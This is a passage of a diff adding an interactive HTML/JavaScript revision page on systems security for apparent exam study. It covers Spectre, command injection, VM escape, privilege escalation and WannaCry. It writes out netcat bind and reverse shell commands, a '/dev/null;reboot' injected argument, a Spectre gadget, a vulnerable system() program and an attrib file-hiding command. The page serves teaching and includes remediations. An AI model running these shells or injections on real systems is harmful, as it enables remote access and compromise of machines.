+      <p>A computing system = <strong>hardware components</strong> combined with <strong>system software</strong> executing userland applications. Critically, exploits frequently <em>cross layer boundaries</em> — for example, leaking speculative CPU microarchitectural state back into userland software memory (Spectre). A security specialist must understand full-stack execution, not just one layer.</p>
+    </div>
+
+    <h3>6.1 Six-tier system attack taxonomy</h3>
+    <div class="hv-stack" style="max-width:640px">
+      <div class="hv-layer hv-hw">HARDWARE</div>
+      <div class="hv-layer hv-hyp">HYPERVISORS</div>
+      <div class="hv-layer hv-guest">OS KERNELS</div>
+      <div class="hv-layer hv-host">SYSTEM SOFTWARE</div>
+      <div class="hv-layer hv-guest">APPLICATION SOFTWARE</div>
+      <div class="hv-layer hv-hyp">SOFTWARE (CONTROL FLOW)</div>
+    </div>
+
+    <div class="tblwrap">
+      <table>
+        <thead><tr><th>System layer</th><th>Primary threat focus</th><th>Slide representative vulnerability</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Hardware</strong></td><td>Physical tampering, clock/voltage manipulation, microarchitectural leaks.</td><td>Fault injection (PGFI, LFI), Spectre side-channel.</td></tr>
+          <tr><td><strong>Hypervisors</strong></td><td>Virtualisation isolation breaches, hypervisor replacement.</td><td>VM Escape (VENOM CVE-2015-3456), Hyperjacking.</td></tr>
+          <tr><td><strong>OS Kernels</strong></td><td>Ring 0 execution, privilege elevation, container escapes.</td><td>Kernel rootkits, Dirty COW (CVE-2016-5195), jailbreaking.</td></tr>
+          <tr><td><strong>System Software</strong></td><td>Shared library manipulation, package repository subversion, crypto-virology.</td><td><code>LD_PRELOAD</code> exploitation, ransomware WannaCry.</td></tr>
+          <tr><td><strong>Applications / Software</strong></td><td>Control flow diversion, command interpreter subversion.</td><td>Stack smashing, ROP, command injection (<code>system()</code>).</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ============================ 7 ============================ -->
+  <section id="s7">
+    <h2>7 · Hardware &amp; Microarchitectural Attacks</h2>
+    <p class="lede">When the silicon itself is the vulnerability, software patches can only mitigate — never cure.</p>
+
+    <h3>7.1 Three hardware attack classes</h3>
+    <div class="grid2">
+      <div class="card"><h4>Counterfeit attacks</h4><p>Distribution of tampered hardware components (manufacturing-stage hardware Trojans with built-in backdoors), or dropping malicious USB drives that emulate Human Interface Devices (HID) and inject keystrokes.</p></div>
+      <div class="card"><h4>Micro-architectural attacks</h4><p>Targeting CPU implementation details — speculative execution side-channels, DRAM hardware vulnerabilities.</p></div>
+    </div>
+    <div class="card"><h4>Fault injection attacks</h4><p>Physical tampering to alter instruction execution within integrated circuits.</p></div>
+
+    <h3>7.2 Four fault-injection techniques compared</h3>
+    <div class="tblwrap">
+      <table>
+        <thead><tr><th>Technique</th><th>Abbr.</th><th>Sample access required</th><th>Mechanism</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Power/Clock Glitch Fault Injection</strong></td><td><span class="pill green">PGFI</span></td><td><strong>Pin access only</strong> (non-invasive)</td><td>Voltage or clock-frequency glitches injected into external IC pins.</td></tr>
+          <tr><td><strong>Light/Laser Fault Injection</strong></td><td><span class="pill amber">LFI</span></td><td>Front-side / back-side <strong>depackaging required</strong></td><td>Targeted optical laser pulses onto the exposed silicon die.</td></tr>
+          <tr><td><strong>Electromagnetic Fault Injection</strong></td><td><span class="pill purple">EMFI</span></td><td>Front-side / back-side <strong>partial depackaging</strong></td><td>Localised periodic EM pulses near the chip surface.</td></tr>
+          <tr><td><strong>Body Biased Fault Injection</strong></td><td><span class="pill blue">BBFI</span></td><td>Back-side <strong>depackaging required</strong></td><td>Bias voltage applied directly to the silicon substrate from the rear.</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>7.3 Case study — Spectre (CVE-2017-5753 / CVE-2017-5715)</h3>
+    <div class="card danger">
+      <h4>Root cause</h4>
+      <p>Spectre exploits <strong>speculative execution</strong>, a performance optimisation. When the CPU hits a conditional branch whose operand is in slow DRAM, it predicts the branch and executes ahead. If the prediction is wrong it rolls back the <em>architectural</em> state — but <strong>leaves microarchitectural cache modifications intact</strong>. That residue is the leak.</p>
+    </div>
+
+    <p><strong>Lecture code:</strong></p>
+<pre class="code">#define PAGESIZE 4096
+unsigned char array1[16];
+unsigned int  array1_size = 16;
+int x;                          /* out-of-bounds index, attacker controlled */
+unsigned char array2[256 * PAGESIZE];   /* timing side-channel instrument */
+unsigned char y;
+
+if (x &lt; array1_size) {
+    y = array2[array1[x] * PAGESIZE];
+}</pre>
+
+    <h4>Step through the exploit</h4>
+    <div class="card">
+      <div class="btnrow" id="spec-btns"></div>
+      <div style="margin-top:6px">
+        <div class="mono" style="font-size:.78rem;color:#8b9ab0;margin-bottom:4px;">array1[16]</div>
+        <div class="arr1" id="arr1"></div>
+        <div class="mono" style="font-size:.78rem;color:#8b9ab0;margin-bottom:4px;margin-top:12px;">array2[256 × 4096] &nbsp;—&nbsp; 256 cache lines</div>
+        <div class="arr2" id="arr2"></div>
+      </div>
+      <div class="spectre-console" id="spec-console"></div>
+      <div class="btnrow">
+        <button class="btn" id="spec-reset">Reset with a new random secret</button>
+      </div>
+    </div>
+
+    <div class="card warn">
+      <h4>Remediation reality</h4>
+      <p>Because Spectre targets a <em>fundamental hardware performance feature</em>, no simple software patch removes the root cause. Mitigation requires extensive OS and compiler-level hardening (retpolines, array index masking, cache flushing barriers) — and costs performance.</p>
+    </div>
+  </section>
+
+  <!-- ============================ 8 ============================ -->
+  <section id="s8">
+    <h2>8 · Software &amp; Control-Flow Attacks</h2>
+    <p class="lede">Code injection and command injection both boil down to the same failure: untrusted data being treated as instructions.</p>
+
+    <h3>8.1 Control-flow hijacking</h3>
+    <div class="grid2">
+      <div class="card">
+        <h4>Stack smashing</h4>
+        <p>Overwriting stack memory buffers to replace a function's <strong>return address</strong> with an address pointing at injected shellcode.</p>
+      </div>
+      <div class="card">
+        <h4>Return-Oriented Programming (ROP)</h4>
+        <p>Chaining together small existing snippets (<em>gadgets</em>) ending in <code class="inl">ret</code> inside legitimate system binaries — bypassing <strong>Write-XOR-Execute</strong> (<code class="inl">W ⊕ X</code>) memory protections because no new code is ever written.</p>
+      </div>
+    </div>
+
+    <div class="card">
+      <h4>Code injection vs command injection</h4>
+      <p><strong>Code injection:</strong> malicious input is supplied to a <em>generator</em> program, which produces executable code consumed and run by an <em>executor</em> program.</p>
+      <p><strong>Command injection:</strong> a specialised subcategory where unvalidated user input is passed directly into an OS command interpreter shell (<code class="inl">/bin/sh</code> or <code class="inl">cmd.exe</code>).</p>
+    </div>
+
+    <h3>8.2 The vulnerable C program from the slides</h3>
+<pre class="code">#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main(int argc, char* argv[])
+{
+    for (int i = 1; i &lt; argc; i++) {
+        char cmd[256] = "/usr/bin/cat ";
+        strncat(cmd, argv[i], sizeof(cmd) - strlen(cmd) - 1);
+        system(cmd);
+    }
+    return 0;
+}</pre>
+
+    <p><strong>Flaw:</strong> <code class="inl">strncat()</code> correctly bounds the string length — there is no buffer overflow here. But it <strong>does not sanitise shell metacharacters</strong> (<code class="inl">;</code>, <code class="inl">|</code>, <code class="inl">&amp;</code>, <code class="inl">$()</code>, backticks). Whatever survives goes straight into <code class="inl">system()</code>, which hands it to <code class="inl">/bin/sh</code>.</p>
+
+    <h3>8.3 Try the exploit — interactive</h3>
+    <div class="ci-box">
+      <label for="ci-input" style="font-size:.82rem;color:#8b9ab0;">Simulated <code class="inl">argv[i]</code> — edit this value:</label>
+      <input type="text" id="ci-input" value="/dev/null;reboot" spellcheck="false">
+      <div class="ci-out" id="ci-out"></div>
+    </div>
+
+    <div class="card good">
+      <h4>Remediation</h4>
+      <p>Avoid invoking a command interpreter through <code class="inl">system()</code>. Instead, <strong>sanitise/allow-list inputs strictly</strong>, or execute the binary directly with <code class="inl">execve()</code> and pass the filename as an argument vector element — the shell then never parses the metacharacters at all.</p>
+    </div>
+  </section>
+
+  <!-- ============================ 9 ============================ -->
+  <section id="s9">
+    <h2>9 · Hypervisor Architecture &amp; Virtualisation Vulnerabilities</h2>
+    <p class="lede">Virtualisation adds a layer — and a new attack surface that sits <em>below</em> the guest OS.</p>
+
+    <h3>9.1 Three hypervisor models</h3>
+    <div class="btnrow" id="hv-btns"></div>
+    <div class="hv-stack" id="hv-stack"></div>
+    <div class="viz-desc" id="hv-desc"></div>
+
+    <h3>9.2 Virtualisation attack categories</h3>
+    <div class="card danger">
+      <h4>Hyperjacking</h4>
+      <p>Replacing or inserting a rogue, malicious hypervisor underneath or alongside the legitimate one. Because the rogue hypervisor runs at a lower layer than the guest OS, <strong>its presence is virtually impossible to detect from inside the OS</strong>.</p>
+    </div>
+    <div class="card danger">
+      <h4>Virtual Machine Rootkit</h4>
+      <p>A specialised hyperjacking attack where a rootkit running underneath the OS spawns <strong>invisible separate virtual machines</strong> to execute hidden malware operations.</p>
+    </div>
+    <div class="card danger">
+      <h4>Virtual Machine Escape</h4>
+      <p>An exploit that breaks the hypervisor's isolation boundary, letting a process inside a guest VM execute arbitrary code directly on the <strong>host OS or hypervisor</strong>.</p>
+    </div>
+
+    <h3>9.3 VM Escape case studies</h3>
+    <div class="tblwrap">
+      <table>
+        <thead><tr><th>CVE</th><th>Component</th><th>Mechanism</th></tr></thead>
+        <tbody>
+          <tr>
+            <td><strong>CVE-2015-3456<br>VENOM</strong></td>
+            <td>QEMU virtual Floppy Disk Controller (FDC) — affects Xen &lt; 4.5.x and KVM</td>
+            <td>Local guest administrators send crafted malformed commands (<code>FD_CMD_READ_ID</code>, <code>FD_CMD_DRIVE_SPECIFICATION_COMMAND</code>) triggering an <strong>out-of-bounds buffer write</strong>, escaping the VM to run host-level code.</td>
+          </tr>
+          <tr>
+            <td><strong>CVE-2017-4907</strong></td>
+            <td>VMware Workstation — SVGA 3D graphics acceleration driver</td>
+            <td>Arbitrary guest-to-host code execution.</td>
+          </tr>
+          <tr>
+            <td><strong>CVE-2020-3960</strong></td>
+            <td>VMware host escape</td>
+            <td>Flaw caused by uninitialised stack memory handling.</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ============================ 10 ============================ -->
+  <section id="s10">
+    <h2>10 · OS Kernel Attacks &amp; Privilege Escalation</h2>
+    <p class="lede">Ring 0 is the whole game: whoever controls the kernel controls everything above it.</p>
+
+    <h3>10.1 Kernel threat vectors</h3>
+    <div class="grid2">
+      <div class="card">
+        <h4>Loadable Kernel Modules (LKMs)</h4>
+        <p>Monolithic kernels (e.g. Linux) load device drivers and network protocols dynamically as LKMs. An attacker who inserts a malicious LKM gains <strong>unrestricted Ring 0 access</strong> to intercept system calls and user processes.</p>
+      </div>
+      <div class="card">
+        <h4>Kernel rootkits</h4>
+        <p>Persistent or volatile malicious code installed directly in Ring 0 kernel space. They alter kernel structures (e.g. <strong>system call tables</strong>), making detection via standard userland utilities impossible — typically requiring a full OS reinstall.</p>
+      </div>
+    </div>
+    <div class="card"><h4>Jailbreaking</h4><p>Using a kernel privilege-escalation exploit to break an application out of its restricted OS execution sandbox ("jail").</p></div>
+
+    <h3>10.2 Privilege escalation — two directions</h3>
+    <div class="grid2">
+      <div class="card">
+        <h4>Horizontal escalation</h4>
+        <p>Compromise an account, then elevate access to <strong>another account at the same privilege level</strong>, to harvest that user's distinct assets.</p>
+        <p class="mono" style="font-size:.8rem;color:#9fd0ff;">User A ══( same level )══▶ User B</p>
+      </div>
+      <div class="card">
+        <h4>Vertical escalation</h4>
+        <p>Elevate from a restricted low-privilege account (e.g. web server user <code class="inl">www-data</code>) to <strong>administrative / root</strong> (Ring 0), granting full control of system resources.</p>
+        <p class="mono" style="font-size:.8rem;color:#ff9b9b;">www-data ──( elevated )──▶ root</p>
+      </div>
+    </div>
+
+    <h3>10.3 CPU protection rings</h3>
+    <div class="rings-wrap">
+      <svg class="rings" viewBox="0 0 400 400">
+        <circle class="ring3" cx="200" cy="200" r="185"></circle>
+        <circle class="ring1" cx="200" cy="200" r="128"></circle>
+        <circle class="ring0" cx="200" cy="200" r="72"></circle>
+        <text class="ring-text" x="200" y="196">RING 0</text>
+        <text class="ring-sub" x="200" y="213">kernel · drivers</text>
+        <text class="ring-text" x="200" y="132">RING 1</text>
+        <text class="ring-sub" x="200" y="149">device drivers</text>
+        <text class="ring-text" x="200" y="66">RING 3</text>
+        <text class="ring-sub" x="200" y="83">userland apps</text>
+        <circle id="escalate-dot" cx="200" cy="345" r="9"></circle>
+      </svg>
+      <div style="flex:1;min-width:220px">
+        <p><strong>Ring 0</strong> (most privileged) houses the OS kernel and device drivers.</p>
+        <p><strong>Ring 1</strong> is largely unused on modern systems, historically for device drivers.</p>
+        <p><strong>Ring 3</strong> (least privileged) houses userland applications and unprivileged user processes.</p>
+        <div class="btnrow">
+          <button class="btn primary" id="escalate-btn">Run vertical escalation →</button>
+        </div>
+        <p style="font-size:.82rem;color:#8b9ab0;">Watch the dot climb from Ring 3 into Ring 0 — that is exactly what an exploit like Dirty COW achieves.</p>
+      </div>
+    </div>
+
+    <h3>10.4 Four primary privilege-escalation pathways</h3>
+    <div class="tblwrap">
+      <table>
+        <thead><tr><th>#</th><th>Pathway</th><th>Detail</th></tr></thead>
+        <tbody>
+          <tr><td>1</td><td><strong>Kernel exploits</strong></td><td>Exploiting kernel vulnerabilities — e.g. <strong>Dirty COW (CVE-2016-5195)</strong>, a Copy-On-Write race condition allowing writes to read-only root files such as <code>/etc/passwd</code>.</td></tr>
+          <tr><td>2</td><td><strong>Exploiting SUDO rights</strong></td><td>Misconfigured <code>/etc/sudoers</code> rules letting standard users execute specific binaries as <code>root</code>.</td></tr>
+          <tr><td>3</td><td><strong>Exploiting SUID executables</strong></td><td>Binaries carrying the <em>Set Owner User ID</em> bit execute with the file owner's (root's) privileges.</td></tr>
+          <tr><td>4</td><td><strong>User enumeration</strong></td><td>Probing system configuration and home-directory permissions to find exposed security tokens or credentials.</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ============================ 11 ============================ -->
+  <section id="s11">
+    <h2>11 · System Software Attacks &amp; Crypto-Virology</h2>
+    <p class="lede">Attack the shared runtime and you compromise every program that uses it.</p>
+
+    <h3>11.1 Threat mechanisms</h3>
+    <div class="card">
+      <h4>Dynamic linking attacks — <code class="inl">LD_PRELOAD</code></h4>
+      <p>On Linux, setting the <code class="inl">LD_PRELOAD</code> environment variable forces the dynamic linker to load specified shared objects (<code class="inl">.so</code>) <strong>before</strong> the standard system C library (<code class="inl">libc.so</code>). An attacker can therefore intercept any standard function call — <code class="inl">read()</code>, <code class="inl">write()</code>, <code class="inl">open()</code> — and log, alter or suppress it.</p>
+    </div>
+    <div class="card">
+      <h4>Package management attacks</h4>
+      <p>Subverting OS package managers (<code class="inl">apt</code>, <code class="inl">yum</code>) by deploying malicious repository signing keys, creating malicious packages signed with valid keys, or exploiting bugs in the package-manager binary itself.</p>
+    </div>
+    <div class="card">
+      <h4>Ransomware (crypto-virology)</h4>
+      <p>Malware that permanently blocks access to victim files by encrypting them with random symmetric/asymmetric key pairs. Advanced ransomware targets <strong>backup storage</strong> and performs <strong>double extortion</strong> — exfiltrating data before encryption and threatening public release.</p>
+    </div>
+
+    <h3>11.2 Case study — WannaCry</h3>
+    <div class="tblwrap">
+      <table>
+        <thead><tr><th>Aspect</th><th>Detail</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Global impact</strong></td><td>Infected over <strong>200,000 computers</strong> across <strong>150+ countries</strong> in just 2 days, May 2017.</td></tr>
+          <tr><td><strong>Spread vector</strong></td><td>SMB network protocol vulnerability exploited via <strong>EternalBlue</strong> — self-propagated automatically across enterprise LANs and the internet <em>with no user action</em> (i.e. worm-like behaviour).</td></tr>
+          <tr><td><strong>Ransom mechanism</strong></td><td>Encrypted victim drives; demanded payment strictly in <strong>Bitcoin</strong> ($300–$600) to unmonitored crypto-wallets, making payments non-trivial to trace.</td></tr>
+          <tr><td><strong>Root cause</strong></td><td>Microsoft patched the SMB flaw in <strong>March 2017</strong>, but many organisations — including public hospitals — were still running <strong>older, unsupported Windows</strong> (XP, even Windows 3.0) with no active security updates.</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="card warn">
+      <h4>The exam takeaway</h4>
+      <p>WannaCry is a textbook example of <em>worm + ransomware</em> convergence: autonomous propagation combined with destructive cryptographic payload, succeeding largely due to <strong>patch-debt on unsupported legacy OS</strong>.</p>
+    </div>
+  </section>
+
+  <!-- ============================ 12 ============================ -->
+  <section id="s12">
+    <h2>12 · Summary Matrix &amp; Self-Test</h2>
+
+    <h3>12.1 Revision topic summary matrix</h3>
+    <div class="tblwrap">
+      <table>
+        <thead><tr><th>Topic area</th><th>Core security concept</th><th>Key technical examples / commands</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Malware Intro</strong></td><td>Cross-platform execution</td><td>Adwind Trojan (<code>BgHSYtccjkN.ELbrtQ</code> in hidden folder, <code>.plist</code> <code>RunAtLoad</code>).</td></tr>
+          <tr><td><strong>Viruses</strong></td><td>Mutation &amp; insertion mechanics</td><td>Amoeba (head/tail), Cavity B (fractionated), time bomb <code>If "%date%" NEQ…</code>.</td></tr>
+          <tr><td><strong>Worms</strong></td><td>Autonomous propagation</td><td>Ikee/Duh (<code>Ikee.B</code>, SSH <code>alpine</code>), Morris, Stuxnet, EternalRocks.</td></tr>
+          <tr><td><strong>Backdoors / RATs</strong></td><td>Netcat remote administration</td><td>Bind shell <code>nc -nlvp 6666 -e /bin/sh</code>; reverse shell <code>nc 192.168.1.1 4444 -e /bin/sh</code>.</td></tr>
+          <tr><td><strong>Stealth</strong></td><td>Attribute concealment</td><td><code>attrib +s +a +h &lt;file&gt;</code>, Explorer folder options.</td></tr>
+          <tr><td><strong>Hardware security</strong></td><td>Fault injection &amp; side-channels</td><td>PGFI (pins only), LFI (depackaging), Spectre <code>y = array2[array1[x] * 4096]</code>.</td></tr>
+          <tr><td><strong>Software security</strong></td><td>Command injection</td><td>C code <code>strncat(cmd, argv[i], …)</code> exploited via <code>/dev/null;reboot</code>.</td></tr>
+          <tr><td><strong>Hypervisors</strong></td><td>VM escape &amp; isolation breach</td><td>VENOM (CVE-2015-3456, QEMU FDC out-of-bounds write).</td></tr>
+          <tr><td><strong>OS kernels</strong></td><td>Ring 0 &amp; escalation</td><td>LKMs, kernel rootkits, vertical/horizontal escalation, Dirty COW (CVE-2016-5195).</td></tr>
+          <tr><td><strong>System software</strong></td><td>Linker hijacking &amp; crypto-virology</td><td>Linux <code>LD_PRELOAD</code> override; WannaCry (SMB / Windows XP).</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>12.2 Self-test</h3>
+    <p>Pick an answer — you get instant feedback and an explanation.</p>
+    <div id="quiz"></div>
+    <div class="score" id="quiz-score">Score: 0 / 0</div>
+  </section>
+
+  </main>
+</div>
+
+<script>
+(function () {
+  "use strict";
+
+  /* =====================================================================
+     1. VIRUS INSERTION MECHANICS VISUALIZER
+     ===================================================================== */
+  var insertionData = [
+    {
+      name: "1 · Overwriting",
+      desc: "The virus completely replaces the original host file code with its own payload. The host program is permanently destroyed — it will never run legitimately again.",
+      segs: [{ k: "virus", t: "VIRUS CODE (the entire file)" }]
+    },
+    {
+      name: "2 · Appending",
+      desc: "The host binary stays intact at the top of the file; the virus code is added to the bottom. The host still runs normally, so the infection is far less obvious.",
+      segs: [{ k: "host", t: "HOST CODE (intact)" }, { k: "virus", t: "VIRUS CODE (appended)" }]
+    },
+    {
+      name: "3 · Prepending A",
+      desc: "Virus code is inserted at the very beginning of the host file, so the malicious instructions execute before the legitimate program code ever runs.",
+      segs: [{ k: "virus", t: "VIRUS CODE (prepended)" }, { k: "host", t: "HOST CODE" }]
+    },
+    {
+      name: "4 · Prepending B (Classic Parasitic)",
+      desc: "The virus prepends itself to the executable and reorganises the host into sequential segments — Host Part 1 then Host Part 2 — which the virus jumps back into after it finishes running.",
+      segs: [{ k: "virus", t: "VIRUS CODE" }, { k: "host", t: "HOST PART 1" }, { k: "host", t: "HOST PART 2" }]
+    },
+    {
+      name: "5 · Cavity A (Header Infection)",
+      desc: "The payload is embedded inside unused, zero-filled header space already present in the host file structure. File size may not change at all, so a simple size check finds nothing.",
+      segs: [
+        { k: "host", t: "HOST HEADER (start)" },
+        { k: "virus", t: "VIRUS → zero-filled header cavity" },
+        { k: "host", t: "HOST HEADER (end) + CODE" }
+      ]
+    },
+    {
+      name: "6 · Cavity B (Fractionated Cavity)",
+      desc: "The virus splits itself into a small Virus Loader plus several separate code fragments (Part 1, Part 2, Part 3), each dispersed into a different empty cavity inside the host executable.",
+      segs: [
+        { k: "virus", t: "VIRUS LOADER (cavity 1)" },
+        { k: "host", t: "HOST CODE" },
+        { k: "virus", t: "PART 1 (cavity 2)" },
+        { k: "host", t: "HOST CODE" },
+        { k: "virus", t: "PART 2 (cavity 3)" },
+        { k: "virus", t: "PART 3 (cavity 4)" }
+      ]
+    },
+    {
+      name: "7 · Amoeba",
+      desc: "The virus splits into two operational blocks: a Virus Head positioned at the beginning of the host executable and a Virus Tail positioned at the very end, with the host code sandwiched between them.",
+      segs: [{ k: "virus", t: "VIRUS HEAD" }, { k: "host", t: "HOST CODE" }, { k: "virus", t: "VIRUS TAIL" }]
+    },
+    {
+      name: "8 · Companion",
+      desc: "The original host program is left completely unmodified. The virus creates a separate executable with the same base name (or a higher-priority extension) so the OS runs the virus companion before or alongside the legitimate program.",
+      segs: [
+        { k: "host", t: "HOST PROGRAM (unmodified)" },
+        { k: "virus", t: "COMPANION FILE (prog.exe = virus)" }
+      ]
+    }
+  ];
+
+  var insBtns = document.getElementById("insertion-btns");
+  var fileStack = document.getElementById("file-stack");
+  var insDesc = document.getElementById("insertion-desc");
+
+  function renderInsertion(idx) {
+    var item = insertionData[idx];
+    fileStack.innerHTML = "";
+    item.segs.forEach(function (s) {
+      var d = document.createElement("div");
+      d.className = "seg seg--" + s.k;
+      d.textContent = s.t;
+      fileStack.appendChild(d);
+    });
+    insDesc.textContent = item.desc;
+    Array.prototype.forEach.call(insBtns.children, function (b, i) {
+      b.classList.toggle("active", i === idx);
+    });
+  }
+
+  insertionData.forEach(function (it, i) {
+    var b = document.createElement("button");
+    b.className = "chip";
+    b.textContent = it.name;
+    b.addEventListener("click", function () { renderInsertion(i); });
+    insBtns.appendChild(b);
+  });
+  renderInsertion(0);
+
+  /* =====================================================================
+     2. WORM PROPAGATION SIMULATOR
+     ===================================================================== */
+  var WCOLS = 12, WROWS = 12, WTOTAL = WCOLS * WROWS;
+  var wormGrid = document.getElementById("worm-grid");
+  var wormStat = document.getElementById("worm-stat");
+  var wormCells = [];
+  var wormState = new Array(WTOTAL).fill(0); // 0 clean, 1 infected, 2 source
+  var wormTimer = null;
+
+  for (var wi = 0; wi < WTOTAL; wi++) {
+    var c = document.createElement("div");
+    c.className = "worm-cell";
+    wormGrid.appendChild(c);
+    wormCells.push(c);
+  }
+
+  function wormReset() {
+    if (wormTimer) { clearInterval(wormTimer); wormTimer = null; }
+    wormState.fill(0);
+    wormCells.forEach(function (c) { c.className = "worm-cell"; });
+    var mid = Math.floor(WROWS / 2) * WCOLS + Math.floor(WCOLS / 2);
+    wormState[mid] = 2;
+    wormCells[mid].classList.add("src");
+    wormStat.textContent = "infected: 1 / " + WTOTAL;
+  }
+
+  function wormStep() {
+    var newInfections = [];
+    for (var i = 0; i < WTOTAL; i++) {
+      if (wormState[i] === 0) continue;
+      var r = Math.floor(i / WCOLS), col = i % WCOLS;
+      var neighbours = [];
+      if (r > 0) neighbours.push(i - WCOLS);
+      if (r < WROWS - 1) neighbours.push(i + WCOLS);
+      if (col > 0) neighbours.push(i - 1);
+      if (col < WCOLS - 1) neighbours.push(i + 1);
+      neighbours.forEach(function (n) {
+        if (wormState[n] === 0 && Math.random() < 0.62) newInfections.push(n);
+      });
+    }
+    if (!newInfections.length) { clearInterval(wormTimer); wormTimer = null; return; }
+    newInfections.forEach(function (n) {
+      wormState[n] = 1;
+      wormCells[n].classList.add("inf");
+    });
+    var count = wormState.filter(function (s) { return s !== 0; }).length;
+    wormStat.textContent = "infected: " + count + " / " + WTOTAL;
+  }
+
+  document.getElementById("worm-start").addEventListener("click", function () {
+    if (wormTimer) return;
+    wormTimer = setInterval(wormStep, 420);
+  });
+  document.getElementById("worm-reset").addEventListener("click", wormReset);
+  wormReset();
+
+  /* =====================================================================
+     3. NETCAT DEMO
+     ===================================================================== */
+  var ncData = {
+    bind: {
+      label: "Bind Shell",
+      attacker: '<span class="cm"># connect to the victim\'s listening port</span>\nnc -nv <span class="ip">&lt;VICTIM_IP&gt;</span> 6666',
+      victim: '<span class="cm"># victim binds a shell to port 6666</span>\nnc -nlvp 6666 -e /bin/sh\n<span class="cm"># Windows: nc -l -p 40911 -e cmd.exe</span>',
+      dir: "ltr",
+      note: "The victim binds TCP port 6666 to the OS command shell and listens. The attacker connects straight in and instantly gets a remote command prompt. Downside for the attacker: inbound connections to the victim are usually blocked by firewalls."
+    },
+    reverse: {
+      label: "Reverse Shell",
+      attacker: '<span class="cm"># attacker opens a listener first</span>\nnc -lvp 4444',
+      victim: '<span class="cm"># victim dials OUT to the attacker</span>\nnc 192.168.1.1 4444 -e /bin/sh',
+      dir: "rtl",
+      note: "The attacker listens on port 4444; the victim machine initiates an outbound TCP connection back to the attacker's IP and redirects /bin/sh into it. Because the traffic is outbound, a reverse shell successfully bypasses inbound firewall rules."
+    },
+    transfer: {
+      label: "File Transfer",
+      attacker: '<span class="cm"># sender</span>\nnc -nv <span class="ip">&lt;VICTIM_IP&gt;</span> 6666 &lt; malicious_file',
+      victim: '<span class="cm"># receiver — listen and redirect to a file</span>\nnc -nlvp 6666 &gt; store.out',
+      dir: "ltr",
+      note: "The victim listens on 6666 and redirects all incoming network traffic directly into a file named store.out. The attacker pipes malicious_file over the wire. This is how secondary Trojans and backdoors get installed after initial access."
+    }
+  };
+
+  var ncBtns = document.getElementById("nc-btns");
+  var ncLink = document.getElementById("nc-link");
+  var ncAtk = document.getElementById("nc-attacker");
+  var ncVic = document.getElementById("nc-victim");
+  var ncNote = document.getElementById("nc-note");
+
+  function renderNc(key) {
+    var d = ncData[key];
+    ncAtk.innerHTML = d.attacker;
+    ncVic.innerHTML = d.victim;
+    ncNote.textContent = d.note;
+    ncLink.classList.toggle("rev", d.dir === "rtl");
+    Array.prototype.forEach.call(ncBtns.children, function (b) {
+      b.classList.toggle("active", b.dataset.key === key);
+    });
+  }
+
+  Object.keys(ncData).forEach(function (k) {
+    var b = document.createElement("button");
+    b.className = "chip";
+    b.dataset.key = k;
+    b.textContent = ncData[k].label;
+    b.addEventListener("click", function () { renderNc(k); });
+    ncBtns.appendChild(b);
+  });
+  renderNc("bind");
+
+  /* =====================================================================
+     4. ATTRIB / HIDDEN FILE DEMO
+     ===================================================================== */
+  var attribOut = document.getElementById("attrib-out");
+  var attribHidden = false;
+  var attribShowAll = false;
+
+  function renderAttrib() {
+    var html = '<span class="prompt">C:\\Users\\student&gt;</span> dir\n';
+    html += "\n Volume in drive C has no label.\n";
+    html += " Directory of C:\\Users\\student\n\n";
+    html += "09/09/2016  10:14    &lt;DIR&gt;          .\n";
+    html += "09/09/2016  10:14    &lt;DIR&gt;          ..\n";
+    html += "09/09/2016  10:14             1,024 notes.txt\n";
+    html += "09/09/2016  10:14             4,096 report.docx\n";
+    if (!attribHidden || attribShowAll) {
+      var cls = attribHidden ? ' class="hidden-file"' : "";
+      html += '09/09/2016  10:14    &lt;DIR&gt;          <span' + cls + '>secret_folder</span>';
+      if (attribHidden) html += "   <span class=\"cm\" style=\"color:#5d6e85\">[+s +a +h]</span>";
+      html += "\n";
+    }
+    html += "               2 File(s)          5,120 bytes\n";
+    html += "               3 Dir(s)  41,231,564,800 bytes free\n";
+    attribOut.innerHTML = html;
+  }
+
+  document.getElementById("attrib-btn").addEventListener("click", function () {
+    attribHidden = !attribHidden;
+    attribShowAll = false;
+    this.textContent = attribHidden ? "attrib -s -a -h secret_folder" : "attrib +s +a +h secret_folder";
+    renderAttrib();
+  });
+  document.getElementById("attrib-reset").addEventListener("click", function () {
+    attribShowAll = true;
+    renderAttrib();
+  });
+  renderAttrib();
+
+  /* =====================================================================
+     5. SPECTRE STEP-THROUGH
+     ===================================================================== */
+  var arr1El = document.getElementById("arr1");
+  var arr2El = document.getElementById("arr2");
+  var specConsole = document.getElementById("spec-console");
+  var specBtns = document.getElementById("spec-btns");
+  var specSecret = 0x41;
+  var specX = 40;
+
+  // build array1 (16 cells + out-of-bounds marker)
+  for (var a1 = 0; a1 < 16; a1++) {
+    var d1 = document.createElement("div");
+    d1.className = "cell1";
+    d1.textContent = a1;
+    arr1El.appendChild(d1);
+  }
+  var gap = document.createElement("div");
+  gap.className = "cell1";
+  gap.style.background = "transparent";
+  gap.style.border = "1px dashed #2c3c50";
+  gap.textContent = "…";
+  arr1El.appendChild(gap);
+  var oob = document.createElement("div");
+  oob.className = "cell1 oob";
+  oob.textContent = "x";
+  arr1El.appendChild(oob);
+
+  // build array2 (256 cells)
+  for (var a2 = 0; a2 < 256; a2++) {
+    var d2 = document.createElement("div");
+    d2.className = "cell2";
+    arr2El.appendChild(d2);
+  }
+
+  var specSteps = [
+    {
+      label: "1 · Array setup",
+      text: "array1[16] and array1_size are allocated. array2[256 * 4096] is allocated as a timing probe — it spans 256 distinct 4 KB pages.\n\nThe secret byte lives just past the end of array1, at array1[40] (out of bounds).",
+      apply: function () {
+        oob.classList.remove("target");
+      }
+    },
+    {
+      label: "2 · Choose out-of-bounds index",
+      text: "The attacker picks x = 40. array1[40] is OUT OF BOUNDS of the 16-byte array — but a C program will happily read there.",
+      apply: function () {
+        oob.classList.add("target");
+      }
+    },
+    {
+      label: "3 · Trigger speculative execution",
